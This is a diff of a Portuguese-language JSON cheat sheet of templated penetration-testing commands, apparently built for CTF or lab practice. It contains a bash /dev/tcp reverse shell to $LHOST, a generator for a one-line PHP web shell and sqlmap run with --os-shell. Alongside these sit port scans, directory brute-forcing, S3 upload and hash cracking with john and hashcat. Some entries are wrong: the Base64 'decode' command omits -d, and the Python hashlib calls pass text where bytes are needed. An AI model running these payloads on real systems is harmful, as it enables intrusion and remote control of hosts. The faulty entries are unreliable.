@@ -1,34 +1,252 @@
 [
   {
-    "tool": "nmap",
-    "payload": "nmap -sS -pN -p- --min-rate 5000 --open -oG allPorts.txt $RHOST",
-    "so": ["Linux","Windows"],
-    "service": "-",
-    "port": 0,
-    "note": "Realiza um scan rápido por portas abertas no alvo."
-  },
-  {
-    "tool": "smbclient",
-    "payload": "smbclient $RHOST",
-    "so": ["Linux","Windows"],
-    "service": "SMB",
-    "port": 445,
-    "note": "Conexão via SMB com usuário anônimo."
-  },
-  {
-    "tool": "smbclienta",
-    "payload": "smbclient $RHOSTs",
-    "so": ["Linux","Windows"],
-    "service": "SMB",
-    "port": [445,25],
-    "note": "Conexão via SMB com usuário anônimo."
-  },
-  {
-    "tool": "",
-    "payload": "",
-    "so": [],
-    "service": "",
+    "tool": ["nmap"],
+    "description":"Port scan TCP rápido em todas as portas.",
+    "command": "nmap -sS -pN -p- --min-rate 5000 --open -oG $FILEOUT $RHOST",
+    "service": ["TCP"],
     "port": [],
+    "category": ["Enumeration"],
+    "so": ["Linux","Windows"],
+    "note": ""
+  },
+  {
+    "tool": ["nmap"],
+    "description":"Port scan UDP nas 100 principais portas.",
+    "command": "nmap -sUV -sC --top-ports 100 -oG $FILEOUT $RHOST",
+    "service": ["UDP"],
+    "port": [],
+    "category": ["Enumeration"],
+    "so": ["Linux","Windows"],
+    "note": ""
+  },
+  {
+    "tool": ["nmap"],
+    "description":"Port scan TCP padrão em portas específicas.",
+    "command": "nmap -sV -sC -p $RPORT -oG $FILEOUT $RHOST",
+    "service": ["TCP"],
+    "port": [],
+    "category": ["Enumeration"],
+    "so": ["Linux","Windows"],
+    "note": ""
+  },
+  {
+    "tool": ["whatweb"],
+    "description":"Scan de tecnologias utilizadas pelo website.",
+    "command": "whatweb http://$RHOST/",
+    "service": ["HTTP","HTTPS"],
+    "port": [80,443],
+    "category": ["Enumeration"],
+    "so": ["Linux"],
+    "note": ""
+  },
+  {
+    "tool": ["feroxbuster"],
+    "description":"Brute force de diretórios web",
+    "command": "feroxbuster -w /usr/share/seclists/Discovery/Web-Content/common.txt -r -o $FILEOUT -u $RHOST",
+    "service": [],
+    "port": [],
+    "category": ["Enumeration"],
+    "so": ["Linux"],
+    "note": ""
+  },
+  {
+    "tool": ["awscli"],
+    "description":"Configuração arbitrária",
+    "command": "aws configure",
+    "service": ["AWS"],
+    "port": [],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": "Insira o valor temp em todos os campos."
+  },
+  {
+    "tool": ["awscli"],
+    "description":"Listar buckets",
+    "command": "aws --endpoint=$RHOST s3 ls",
+    "service": ["AWS"],
+    "port": [],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["awscli"],
+    "description":"Listar objetos do bucket",
+    "command": "aws --endpoint=http://s3.$RHOST s3 ls s3://$RHOST",
+    "service": ["AWS"],
+    "port": [],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["awscli"],
+    "description":"Upload de arquivo",
+    "command": "aws --endpoint=http://s3.$RHOST s3 cp $FILEIN s3://$RHOST",
+    "service": ["AWS"],
+    "port": [],
+    "category": ["Enumeration"],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["file"],
+    "description":"Gerar payload de RCE em PHP",
+    "command": "echo '<?php system($_GET['cmd']); ?>' > $FILEOUT.php",
+    "service": ["PHP"],
+    "port": [],
+    "category": ["Payload"],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["sqlmap"],
+    "description":"Scan de SQLi utilizando cookie e shell interativa",
+    "command": "sqlmap -u '$RHOST/exemple?parameter=value' --cookie='$KEY=$VALUE' --os-shell",
+    "service": ["SQL"],
+    "port": [],
+    "category": ["Enumeration"],
+    "so": ["Linux"],
+    "note": ""
+  },
+  {
+    "tool": ["bash"],
+    "description":"Reverse shell utilizando /dev/tcp",
+    "command": "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'",
+    "service": [""],
+    "port": [],
+    "category": ["Enumeration"],
+    "so": ["Linux"],
+    "note": ""
+  },
+  {
+    "tool": ["md5sum"],
+    "description":"Aplicar função hash MD5",
+    "command": "echo -n '$TEXT' | md5sum",
+    "service": ["MD5"],
+    "port": [],
+    "category": [],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["sha256sum"],
+    "description":"Aplicar função hash SHA256",
+    "command": "echo -n '$TEXT' | sha256sum",
+    "service": ["SHA256"],
+    "port": [],
+    "category": [],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["base64"],
+    "description":"Encondar texto em Base64",
+    "command": "echo -n '$TEXT' | base64",
+    "service": ["Base64"],
+    "port": [],
+    "category": [],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["base64"],
+    "description":"Decodar texto em Base64",
+    "command": "echo -n '$TEXT' | base64",
+    "service": ["Base64"],
+    "port": [],
+    "category": [],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["base64"],
+    "description":"Encondar imagem em Base64",
+    "command": "cat $FILEIN | base64 > $FILEOUT",
+    "service": ["Base64"],
+    "port": [],
+    "category": [],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["base64"],
+    "description":"Decodar imagem em Base64",
+    "command": "cat $FILEIN | base64 -d > $FILEOUT",
+    "service": ["Base64"],
+    "port": [],
+    "category": [],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["hashid"],
+    "description":"Identificar qual o tipo do Hash",
+    "command": "hashid $HASH",
+    "service": [],
+    "port": [],
+    "category": [],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["hash-identifier"],
+    "description":"Identificar qual o tipo do Hash",
+    "command": "hash-identifier",
+    "service": [],
+    "port": [],
+    "category": [],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["python"],
+    "description":"Aplicar função de hash MD5 com python",
+    "command": "import hashlib;hashlib.md5('$TEXT').hexdigest();",
+    "service": [],
+    "port": [],
+    "category": [],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["python"],
+    "description":"Aplicar função de hash SHA256 com python",
+    "command": "import hashlib;hashlib.sha256('$TEXT').hexdigest();",
+    "service": [],
+    "port": [],
+    "category": [],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["john"],
+    "description":"Brute force básico de hash",
+    "command": "john $HASH",
+    "service": [],
+    "port": [],
+    "category": [],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": ["hashcat"],
+    "description":"Brute force básico de hash SHA1",
+    "command": "hashcat -m 100 $HASH $WORDLIST --force",
+    "service": [],
+    "port": [],
+    "category": [],
+    "so": [],
+    "note": ""
+  },
+  {
+    "tool": [],
+    "description":"",
+    "command": "",
+    "service": [],
+    "port": [],
+    "category": [],
+    "so": [],
     "note": ""
   }
 ]
